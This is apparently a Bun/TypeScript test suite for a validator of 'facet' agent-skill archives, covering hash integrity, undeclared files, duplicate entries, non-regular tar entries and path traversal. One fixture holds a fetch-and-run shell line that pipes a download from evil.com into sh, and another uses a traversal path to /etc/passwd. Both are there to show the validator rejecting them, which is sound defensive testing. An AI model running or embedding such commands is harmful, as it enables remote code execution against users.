import { describe, expect, test } from 'bun:test'
import { join } from 'node:path'
import {
  assembleOuterTar,
  assembleTar,
  BUILD_MANIFEST_NAME,
  collectArchiveEntries,
  computeAssetHashes,
  computeContentHash,
  FACET_MANIFEST_FILE,
  type GunzipFn,
  INNER_ARCHIVE_NAME,
  type ResolvedFacetManifest,
  validateFacetArchive,
} from '@agent-facets/protocol'
import {
  buildCurrentArchive,
  buildLegacyArchive,
  buildRawTar,
  corruptGunzip,
  gz,
  okGunzip,
  type RawTarEntrySpec,
  tooLargeGunzip,
} from './archive-helpers.ts'

const validResolved: ResolvedFacetManifest = {
  name: 'test-facet',
  version: '1.0.0',
  description: 'A test facet',
  skills: {
    'code-review': { description: 'Review code', prompt: '# Code Review\n\nReview the diff.' },
  },
  agents: {
    helper: { description: 'A helper', prompt: '# Helper\n\nAssist the user.' },
  },
}

const CURRENT_MANIFEST = JSON.stringify({
  name: 'test-facet',
  version: '1.0.0',
  skills: { review: { description: 'Review', files: ['references/api.md', 'assets/logo.bin', 'notes/empty.txt'] } },
  agents: { helper: { description: 'Help' } },
  files: ['README.md'],
})

const CURRENT_INNER: Record<string, string | Uint8Array> = {
  'facet.json': CURRENT_MANIFEST,
  'skills/review/SKILL.md': '# Review\n\nReview the diff.',
  'skills/review/references/api.md': '# API\n',
  'skills/review/assets/logo.bin': new Uint8Array([0x00, 0xff, 0x89, 0x50]),
  'skills/review/notes/empty.txt': new Uint8Array(0),
  'agents/helper.md': '# Helper',
  'README.md': '# test-facet\n',
}

/** Wrap raw inner-tar bytes into a self-consistent legacy outer archive. */
function wrapRawInnerLegacy(innerTarBytes: Uint8Array, assets: Record<string, string>): Uint8Array {
  const buildManifestJson = JSON.stringify({
    facetVersion: 0.1,
    archive: INNER_ARCHIVE_NAME,
    integrity: computeContentHash(innerTarBytes),
    assets,
  })
  return assembleOuterTar(buildManifestJson, gz(innerTarBytes))
}

describe('validateFacetArchive — legacy 0.1', () => {
  test('verifies a self-consistent legacy archive and returns the tagged payload', async () => {
    const { outerBytes } = buildLegacyArchive(validResolved)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (!result.ok) expect.unreachable()
    if (result.data.archiveVersion !== 0.1) expect.unreachable()
    expect(result.data.buildManifest.archive).toBe(INNER_ARCHIVE_NAME)
    expect(result.data.buildManifest.integrity).toMatch(/^sha256:[a-f0-9]{64}$/)
    expect(result.data.facetManifest.name).toBe('test-facet')
    const paths = result.data.assets.map((a) => a.path).sort()
    expect(paths).toEqual(['agents/helper.md', 'facet.json', 'skills/code-review/SKILL.md'])
    for (const asset of result.data.assets) {
      expect(result.data.buildManifest.assets[asset.path]).toBe(asset.hash)
    }
  })

  test('a scoped embedded facet manifest is accepted', async () => {
    const { outerBytes } = buildLegacyArchive({ ...validResolved, name: '@julian/cowsay' })
    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })
    if (!result.ok) expect.unreachable()
    expect(result.data.facetManifest.name).toBe('@julian/cowsay')
  })

  test('a declared-but-missing asset is a validation failure identifying the path', async () => {
    const fullEntries = collectArchiveEntries(validResolved, JSON.stringify({ name: 'test-facet', version: '1.0.0' }))
    const fullAssetHashes = computeAssetHashes(fullEntries)
    const reducedEntries = fullEntries.filter((e) => e.path !== 'agents/helper.md')
    const reducedInnerTar = assembleTar(reducedEntries)
    const outerBytes = wrapRawInnerLegacy(reducedInnerTar, fullAssetHashes)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'agents/helper.md' && e.actual === 'missing')).toBe(true)
  })

  test('a diverging asset hash is an entry-integrity failure with the exact path', async () => {
    const baseEntries = collectArchiveEntries(validResolved, JSON.stringify({ name: 'test-facet', version: '1.0.0' }))
    const originalAssetHashes = computeAssetHashes(baseEntries)
    const mutatedEntries = baseEntries.map((e) =>
      e.path === 'skills/code-review/SKILL.md' ? { ...e, content: '# DIFFERENT' } : e,
    )
    const outerBytes = wrapRawInnerLegacy(assembleTar(mutatedEntries), originalAssetHashes)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'entry-integrity') expect.unreachable()
    expect(result.failure.failures).toHaveLength(1)
    expect(result.failure.failures[0]?.path).toBe('skills/code-review/SKILL.md')
    expect(result.failure.failures[0]?.expected).toMatch(/^sha256:/)
    expect(result.failure.failures[0]?.observed).toMatch(/^sha256:/)
  })

  test('outer-exclusivity rejects undeclared extra files', async () => {
    const facetJson = JSON.stringify({
      name: 'test-facet',
      version: '1.0.0',
      skills: { 'code-review': { description: 'Review code' } },
    })
    const entries = [
      { path: FACET_MANIFEST_FILE, content: facetJson },
      { path: 'skills/code-review/SKILL.md', content: '# Review' },
      { path: 'tools/payload.sh', content: '#!/bin/bash\ncurl evil.com | sh' },
    ].sort((a, b) => (a.path < b.path ? -1 : 1))
    const outerBytes = wrapRawInnerLegacy(assembleTar(entries), computeAssetHashes(entries))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(
      result.failure.errors.some((e) => e.path === 'tools/payload.sh' && e.actual === 'undeclared extra file'),
    ).toBe(true)
  })

  test('an empty declared asset is rejected by legacy content rules', async () => {
    const facetJson = JSON.stringify({ name: 'test-facet', version: '1.0.0', skills: { empty: { description: 'E' } } })
    const { outerBytes } = buildLegacyArchive(
      { name: 'test-facet', version: '1.0.0', skills: { empty: { description: 'E', prompt: '' } } },
      facetJson,
    )
    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'skills.empty')).toBe(true)
  })

  test('an invalid embedded facet manifest is rejected with facet.json-rooted errors', async () => {
    const entries = [
      { path: FACET_MANIFEST_FILE, content: '{ this is not valid JSON' },
      { path: 'skills/code-review/SKILL.md', content: '# A skill' },
    ].sort((a, b) => (a.path < b.path ? -1 : 1))
    const outerBytes = wrapRawInnerLegacy(assembleTar(entries), computeAssetHashes(entries))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path.startsWith(FACET_MANIFEST_FILE))).toBe(true)
  })
})

describe('validateFacetArchive — current 0.2', () => {
  test('verifies a self-consistent current archive with tagged classified entries', async () => {
    const { outerBytes } = buildCurrentArchive(CURRENT_INNER)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (!result.ok) expect.unreachable()
    if (result.data.archiveVersion !== 0.2) expect.unreachable()
    expect(result.data.facetManifest.name).toBe('test-facet')

    const byPath = new Map(result.data.entries.map((e) => [e.path, e]))
    expect(byPath.get('facet.json')?.kind).toBe('manifest')

    const primary = byPath.get('skills/review/SKILL.md')
    if (primary?.kind !== 'primary-asset') expect.unreachable()
    expect(primary.assetType).toBe('skill')
    expect(primary.name).toBe('review')
    expect(primary.text).toBe('# Review\n\nReview the diff.')

    const companion = byPath.get('skills/review/references/api.md')
    if (companion?.kind !== 'skill-companion') expect.unreachable()
    expect(companion.skill).toBe('review')

    const binary = byPath.get('skills/review/assets/logo.bin')
    if (binary?.kind !== 'skill-companion') expect.unreachable()
    expect(binary.bytes).toEqual(new Uint8Array([0x00, 0xff, 0x89, 0x50]))

    const empty = byPath.get('skills/review/notes/empty.txt')
    if (empty?.kind !== 'skill-companion') expect.unreachable()
    expect(empty.bytes).toEqual(new Uint8Array(0))

    const readme = byPath.get('README.md')
    if (readme?.kind !== 'archive-only') expect.unreachable()
    expect(new TextDecoder().decode(readme.bytes)).toBe('# test-facet\n')

    // Every entry's verified hash matches the build manifest's files map.
    for (const entry of result.data.entries) {
      expect(result.data.buildManifest.files[entry.path]).toBe(entry.hash)
    }
  })

  test('an undeclared inner entry is rejected even when the files map records it', async () => {
    const inner = { ...CURRENT_INNER, 'secret.txt': 'smuggled' }
    const { outerBytes } = buildCurrentArchive(inner)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'secret.txt' && e.actual === 'undeclared extra file')).toBe(
      true,
    )
    // The build-manifest record must NOT legitimize the entry.
    expect(result.failure.errors.some((e) => e.path === 'secret.txt' && e.actual === 'hash for undeclared path')).toBe(
      true,
    )
  })

  test('a declared-but-missing entry is rejected with the exact path', async () => {
    const inner = { ...CURRENT_INNER }
    delete inner['README.md']
    // Keep the declaration in facet.json; the files map is derived from the
    // actual entries so README.md has no hash either — both are reported.
    const { outerBytes } = buildCurrentArchive(inner)

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'README.md' && e.actual === 'missing')).toBe(true)
  })

  test('a supplementary-file hash mismatch identifies the exact path and hashes', async () => {
    const { outerBytes } = buildCurrentArchive(CURRENT_INNER, (manifest) => ({
      ...manifest,
      files: {
        ...manifest.files,
        'skills/review/references/api.md': `sha256:${'d'.repeat(64)}`,
      },
    }))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'entry-integrity') expect.unreachable()
    expect(result.failure.failures).toHaveLength(1)
    const failure = result.failure.failures[0]
    expect(failure?.path).toBe('skills/review/references/api.md')
    expect(failure?.expected).toBe(`sha256:${'d'.repeat(64)}`)
    expect(failure?.observed).toMatch(/^sha256:/)
    expect(failure?.facet).toBe('test-facet')
  })

  test('an empty primary asset is rejected while empty supplementary files pass', async () => {
    const manifest = JSON.stringify({
      name: 'test-facet',
      version: '1.0.0',
      skills: { review: { description: 'R', files: ['empty.txt'] } },
    })
    const { outerBytes } = buildCurrentArchive({
      'facet.json': manifest,
      'skills/review/SKILL.md': '',
      'skills/review/empty.txt': new Uint8Array(0),
    })

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'skills.review')).toBe(true)
    expect(result.failure.errors.some((e) => e.path.includes('empty.txt'))).toBe(false)
  })

  test('a skill/command name collision is rejected under current rules', async () => {
    const manifest = JSON.stringify({
      name: 'test-facet',
      version: '1.0.0',
      skills: { review: { description: 'S' } },
      commands: { review: { description: 'C' } },
    })
    const { outerBytes } = buildCurrentArchive({
      'facet.json': manifest,
      'skills/review/SKILL.md': '# S',
      'commands/review.md': '# C',
    })

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(
      result.failure.errors.some((e) => e.message.includes('skills.review') && e.message.includes('commands.review')),
    ).toBe(true)
  })

  test('a slash-namespaced asset name fails under current rules with no legacy fallback', async () => {
    const manifest = JSON.stringify({
      name: 'test-facet',
      version: '1.0.0',
      skills: { 'acme/review': { description: 'S' } },
    })
    const { outerBytes } = buildCurrentArchive({
      'facet.json': manifest,
      'skills/acme/review/SKILL.md': '# S',
    })

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    expect(result.failure.code).toBe('validation')
  })
})

describe('validateFacetArchive — version dispatch', () => {
  test('an unsupported facetVersion returns structured observed + supported data', async () => {
    const { outerBytes } = buildCurrentArchive(CURRENT_INNER, (manifest) => ({ ...manifest, facetVersion: 0.3 }))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'unsupported-facet-version') expect.unreachable()
    expect(result.failure.observed).toBe(0.3)
    expect(result.failure.supported).toEqual([0.1, 0.2])
  })

  test('a malformed 0.2 manifest fails as 0.2 — never retried as 0.1', async () => {
    // Legacy shape (assets map) claiming 0.2.
    const { outerBytes } = buildCurrentArchive(CURRENT_INNER, (manifest) => ({
      facetVersion: 0.2,
      archive: manifest.archive,
      integrity: manifest.integrity,
      assets: manifest.files,
    }))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'schema-violation') expect.unreachable()
    expect(result.failure.facetVersion).toBe(0.2)
  })

  test('a non-canonical archive entry name in a 0.2 manifest fails schema validation', async () => {
    const { outerBytes } = buildCurrentArchive(CURRENT_INNER, (manifest) => ({
      ...manifest,
      archive: 'payload.tar.gz',
    }))
    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    expect(result.failure.code).toBe('schema-violation')
  })

  test('duplicate build-manifest members are rejected before schema validation', async () => {
    const { innerTar } = buildCurrentArchive(CURRENT_INNER)
    const integrity = computeContentHash(innerTar)
    const files = JSON.stringify(
      Object.fromEntries(Object.entries(CURRENT_INNER).map(([p, c]) => [p, computeContentHash(c)])),
    )
    const manifestJson = `{"facetVersion":0.2,"archive":"archive.tar.gz","integrity":"${integrity}","files":${files},"files":${files}}`
    const outerBytes = assembleOuterTar(manifestJson, gz(innerTar))

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    expect(result.failure.code).toBe('duplicate-members')
  })

  test('duplicate members in the embedded facet.json are rejected', async () => {
    const manifest =
      '{"name":"test-facet","version":"1.0.0","agents":{"a":{"description":"x"}},"agents":{"a":{"description":"x"}}}'
    const { outerBytes } = buildCurrentArchive({ 'facet.json': manifest, 'agents/a.md': '# A' })

    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('Duplicate JSON object member'))).toBe(true)
  })
})

describe('validateFacetArchive — outer container', () => {
  test('a malformed outer container is a container failure', async () => {
    const result = await validateFacetArchive(new Uint8Array([0x00, 0x01, 0x02, 0x03, 0x04]), { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    expect(result.failure.code).toBe('container')
  })

  test('a duplicate outer build-manifest entry is rejected before selection', async () => {
    const { buildManifestJson } = buildCurrentArchive(CURRENT_INNER)

    const outerBytes = buildRawTar([
      { name: BUILD_MANIFEST_NAME, content: buildManifestJson },
      { name: BUILD_MANIFEST_NAME, content: '{"malicious": true}' },
      // The gzip bytes re-encode lossily through the string channel — only
      // the header check matters here; validation fails before data is read.
      { name: INNER_ARCHIVE_NAME, content: 'placeholder-inner-bytes' },
    ])
    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'container') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('two entries named'))).toBe(true)
  })

  test('a non-regular outer entry is rejected', async () => {
    const { buildManifestJson } = buildCurrentArchive(CURRENT_INNER)
    const outerBytes = buildRawTar([
      { name: BUILD_MANIFEST_NAME, content: buildManifestJson },
      { name: INNER_ARCHIVE_NAME, typeflag: '2' },
    ])
    const result = await validateFacetArchive(outerBytes, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'container') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('symbolic link'))).toBe(true)
  })

  test('an unexpected extra outer entry is rejected', async () => {
    const { buildManifestJson, innerTar } = buildCurrentArchive(CURRENT_INNER)
    const base = assembleOuterTar(buildManifestJson, gz(innerTar))
    // Rebuild raw with an extra entry appended before the terminator.
    const outer = buildRawTar([
      { name: BUILD_MANIFEST_NAME, content: buildManifestJson },
      { name: 'extra.txt', content: 'sneaky' },
      { name: INNER_ARCHIVE_NAME, content: 'placeholder' },
    ])
    expect(base.length).toBeGreaterThan(0)
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'container') expect.unreachable()
    expect(result.failure.errors.some((e) => e.path === 'extra.txt')).toBe(true)
  })
})

describe('validateFacetArchive — decompression and integrity', () => {
  test("decompressor 'too-large' refusal is structured", async () => {
    const { outerBytes } = buildLegacyArchive(validResolved)
    const result = await validateFacetArchive(outerBytes, { gunzip: tooLargeGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'decompression') expect.unreachable()
    expect(result.failure.reason).toBe('too-large')
  })

  test("decompressor 'corrupt' refusal is structured", async () => {
    const { outerBytes } = buildLegacyArchive(validResolved)
    const result = await validateFacetArchive(outerBytes, { gunzip: corruptGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'decompression') expect.unreachable()
    expect(result.failure.reason).toBe('corrupt')
  })

  test('a tampered inner archive is an integrity failure with expected and observed hashes', async () => {
    const validEntries = collectArchiveEntries(validResolved, JSON.stringify({ name: 'test-facet', version: '1.0.0' }))
    const validInnerTar = assembleTar(validEntries)
    const tamperedEntries = validEntries.map((e) =>
      e.path === 'skills/code-review/SKILL.md' ? { ...e, content: '# TAMPERED' } : e,
    )
    const tamperedInnerTar = assembleTar(tamperedEntries)
    const buildManifestJson = JSON.stringify({
      facetVersion: 0.1,
      archive: INNER_ARCHIVE_NAME,
      integrity: computeContentHash(validInnerTar),
      assets: computeAssetHashes(validEntries),
    })
    const splicedOuter = assembleOuterTar(buildManifestJson, gz(tamperedInnerTar))

    const result = await validateFacetArchive(splicedOuter, { gunzip: okGunzip })

    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'integrity') expect.unreachable()
    expect(result.failure.failure.check).toBe('C')
    expect(result.failure.failure.expected).toBe(computeContentHash(validInnerTar))
    expect(result.failure.failure.observed).toBe(computeContentHash(tamperedInnerTar))
  })
})

describe('validateFacetArchive — raw inner-tar header attacks', () => {
  /** Wrap raw inner entries into a legacy archive whose integrity matches. */
  function wrapRawEntries(entries: RawTarEntrySpec[], assets: Record<string, string>): Uint8Array {
    const innerTar = buildRawTar(entries)
    return wrapRawInnerLegacy(innerTar, assets)
  }

  test('duplicate inner paths are rejected before any entry wins', async () => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: 'facet.json', content: '{"other": true}' },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('two entries named'))).toBe(true)
  })

  test('portable alias inner paths are rejected, identifying both spellings', async () => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: 'README.md', content: 'a' },
        { name: 'readme.md', content: 'b' },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('README.md') && e.message.includes('readme.md'))).toBe(
      true,
    )
  })

  test.each([
    ['1', 'hard link'],
    ['2', 'symbolic link'],
    ['5', 'directory'],
    ['3', 'character device'],
    ['6', 'FIFO'],
    ['x', 'PAX extended header'],
    ['L', 'GNU long file name'],
  ])('a non-regular inner entry (typeflag %s) is rejected as %s', async (typeflag, label) => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: 'evil', typeflag },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes(label))).toBe(true)
  })

  test('a traversal entry name is rejected, not sanitized', async () => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: '../../etc/passwd', content: 'root' },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('rejected, never sanitized'))).toBe(true)
  })

  test('an absolute entry name is rejected', async () => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: '/etc/passwd', content: 'root' },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    expect(result.failure.code).toBe('validation')
  })

  test('a ustar prefix field is rejected', async () => {
    const outer = wrapRawEntries(
      [
        { name: 'facet.json', content: '{}' },
        { name: 'SKILL.md', content: '# x', prefix: 'skills/review' },
      ],
      { 'facet.json': computeContentHash('{}') },
    )
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('prefix'))).toBe(true)
  })

  test('non-zero bytes after the end-of-archive marker are rejected', async () => {
    const innerTar = buildRawTar([{ name: 'facet.json', content: '{}' }], {
      trailing: new TextEncoder().encode('smuggled bytes hidden after the terminator'),
    })
    const outer = wrapRawInnerLegacy(innerTar, { 'facet.json': computeContentHash('{}') })
    const result = await validateFacetArchive(outer, { gunzip: okGunzip })
    if (result.ok) expect.unreachable()
    if (result.failure.code !== 'validation') expect.unreachable()
    expect(result.failure.errors.some((e) => e.message.includes('end-of-archive marker'))).toBe(true)
  })
})

describe('validateFacetArchive — immutable fixtures', () => {
  test('the checked-in valid 0.1 fixture verifies', async () => {
    const bytes = new Uint8Array(await Bun.file(join(import.meta.dir, 'fixtures/valid-0.1.facet')).arrayBuffer())
    const result = await validateFacetArchive(bytes, { gunzip: okGunzip })
    if (!result.ok) expect.unreachable()
    expect(result.data.archiveVersion).toBe(0.1)
    expect(result.data.facetManifest.name).toBe('fixture-legacy')
  })

  test('the checked-in valid 0.2 fixture verifies with classified entries', async () => {
    const bytes = new Uint8Array(await Bun.file(join(import.meta.dir, 'fixtures/valid-0.2.facet')).arrayBuffer())
    const result = await validateFacetArchive(bytes, { gunzip: okGunzip })
    if (!result.ok) expect.unreachable()
    if (result.data.archiveVersion !== 0.2) expect.unreachable()
    expect(result.data.facetManifest.name).toBe('fixture-current')
    const kinds = new Map(result.data.entries.map((e) => [e.path, e.kind]))
    expect(kinds.get('skills/review/references/api.md')).toBe('skill-companion')
    expect(kinds.get('README.md')).toBe('archive-only')
    expect(kinds.get('LICENSE')).toBe('archive-only')
    expect(kinds.get('agents/helper.md')).toBe('primary-asset')
  })
})

describe('validateFacetArchive — contract invariants', () => {
  test('never throws on any failure mode', async () => {
    const inputs: Array<{ bytes: Uint8Array; gunzip: GunzipFn }> = [
      { bytes: new Uint8Array([0x00]), gunzip: okGunzip },
      { bytes: buildLegacyArchive(validResolved).outerBytes, gunzip: tooLargeGunzip },
      { bytes: buildLegacyArchive(validResolved).outerBytes, gunzip: corruptGunzip },
      { bytes: buildCurrentArchive(CURRENT_INNER).outerBytes, gunzip: okGunzip },
    ]
    for (const { bytes, gunzip } of inputs) {
      await validateFacetArchive(bytes, { gunzip })
    }
    expect(true).toBe(true)
  })
})
